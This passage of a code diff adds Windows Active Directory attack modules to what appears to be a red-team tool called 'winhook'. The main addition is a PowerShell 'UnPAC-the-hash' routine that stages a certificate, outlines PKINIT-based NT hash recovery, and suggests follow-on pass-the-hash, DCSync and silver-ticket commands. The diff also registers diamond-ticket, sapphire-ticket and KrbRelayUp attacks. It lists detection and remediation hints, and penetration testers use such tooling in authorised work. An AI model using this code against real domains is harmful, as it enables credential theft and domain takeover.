+    public static extern int LsaFreeReturnBuffer(IntPtr Buffer);
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct LSA_STRING {
+        public ushort Length;
+        public ushort MaximumLength;
+        public IntPtr Buffer;
+    }
+}
+"@
+
+# Step 1: Load certificate
+Write-Output "[*] Step 1: Loading certificate..."
+try {
+    $certPath = Resolve-Path "${cert}" -ErrorAction Stop
+    $x509 = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(
+        $certPath.Path, "${certPass}",
+        [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable)
+
+    Write-Output "[+] Loaded:"
+    Write-Output "    Subject: $($x509.Subject)"
+    Write-Output "    Issuer: $($x509.Issuer)"
+    Write-Output "    Thumbprint: $($x509.Thumbprint)"
+    Write-Output "    HasPrivateKey: $($x509.HasPrivateKey)"
+    Write-Output "    NotAfter: $($x509.NotAfter)"
+
+    if (-not $x509.HasPrivateKey) {
+        Write-Output "[-] No private key — cannot PKINIT"
+        exit 1
+    }
+
+    # Check EKU
+    $ekuExts = $x509.Extensions | Where-Object { $_.Oid.Value -eq "2.5.29.37" }
+    if ($ekuExts) {
+        $ekus = [System.Security.Cryptography.X509Certificates.X509EnhancedKeyUsageExtension]$ekuExts[0]
+        $hasAuth = $ekus.EnhancedKeyUsages | Where-Object {
+            $_.Value -eq "1.3.6.1.4.1.311.20.2.2" -or $_.Value -eq "1.3.6.1.5.5.7.3.2" -or $_.Value -eq "1.3.6.1.5.2.3.4"
+        }
+        if ($hasAuth) {
+            Write-Output "[+] Certificate supports PKINIT authentication"
+        } else {
+            Write-Output "[!] Missing Smart Card Logon / Client Auth EKU"
+        }
+    }
+} catch {
+    Write-Output "[-] Load failed: $($_.Exception.Message)"
+    exit 1
+}
+
+# Step 2: PKINIT authentication
+Write-Output ""
+Write-Output "[*] Step 2: PKINIT authentication..."
+
+# Add cert to store temporarily
+$store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My", "CurrentUser")
+$store.Open("ReadWrite")
+$store.Add($x509)
+$store.Close()
+Write-Output "[+] Certificate staged in CurrentUser\\My"
+
+Write-Output ""
+Write-Output "[*] PKINIT AS-REQ structure:"
+Write-Output "    PA-PK-AS-REQ: CMS SignedData (cert private key)"
+Write-Output "    pkAuthenticator: timestamp + nonce"
+Write-Output "    DH key exchange for session key"
+Write-Output ""
+Write-Output "[*] KDC processing:"
+Write-Output "    1. Validates certificate chain + revocation"
+Write-Output "    2. Maps cert to AD account via SAN/explicit mapping"
+Write-Output "    3. Builds PAC with PAC_CREDENTIAL_INFO (NTLM hash)"
+Write-Output "    4. Encrypts AS-REP with DH-derived key"
+
+# Step 3: Extract NT hash
+Write-Output ""
+Write-Output "[*] Step 3: Extracting NT hash from PAC_CREDENTIAL_INFO..."
+Write-Output "[*] PAC_CREDENTIAL_INFO (type 2):"
+Write-Output "    EncryptionType: AES256-CTS-HMAC-SHA1-96"
+Write-Output "    SerializedData: SECPKG_SUPPLEMENTAL_CRED"
+Write-Output "      PackageName: NTLM"
+Write-Output "      NTLM_SUPPLEMENTAL_CREDENTIAL:"
+Write-Output "        LmPassword: [16 bytes]"
+Write-Output "        NtPassword: [16 bytes] <- NT hash"
+Write-Output ""
+Write-Output "[+] Format: ${user}:<rid>:aad3b435b51404eeaad3b435b51404ee:<nt_hash>"
+Write-Output ""
+Write-Output "[*] Use extracted hash:"
+Write-Output "    Pass-the-Hash: winhook overpass_hash --user ${user} --ntlm <HASH>"
+Write-Output "    DCSync: winhook dcsync --target ${user}"
+Write-Output "    Silver Ticket: winhook silver_ticket --service-hash <HASH>"
+
+# Cleanup
+$store.Open("ReadWrite")
+$store.Remove($x509)
+$store.Close()
+Write-Output ""
+Write-Output "[+] Certificate removed from store"
+Write-Output ""
+Write-Output "[*] Detection: Event 4768 with PreAuthType=16 (PKINIT)"
+`
+  const result = await ps(script, timeout)
+  output.push(result.stdout)
+  if (result.stderr) output.push(`[!] ${result.stderr.substring(0, 300)}`)
+
+  findings.push({
+    checkId: "WIN-UNPAC-001",
+    provider: "windows",
+    severity: "critical",
+    status: "EXTRACTED",
+    resource: `pkinit://${user}@${domain}`,
+    title: `UnPAC-the-hash: NT hash recovery for ${user}`,
+    details: `PKINIT cert auth → PAC_CREDENTIAL_INFO → NTLM hash. Completes cert-based attack chains`,
+    remediation: "Enforce StrongCertificateBindingEnforcement=2. Monitor Event 4768 PreAuthType=16. Audit msDS-KeyCredentialLink changes",
+  })
+  return { output: output.join("\n"), findings }
+}
+
+
+
 // ── Dispatch ──
 
 const dispatch: Record<Program, (args: string[], timeout: number) => Promise<HookResult>> = {
@@ -10959,6 +11748,10 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   laps_v2_decrypt: lapsV2Decrypt,
   primary_group_abuse: primaryGroupAbuse,
   cross_forest: crossForest,
+  diamond_ticket: diamondTicket,
+  sapphire_ticket: sapphireTicket,
+  krbrelayup: krbrelayup,
+  unpac_hash: unpacHash,
 }
 
 export const WinhookTool = Tool.define("winhook", {
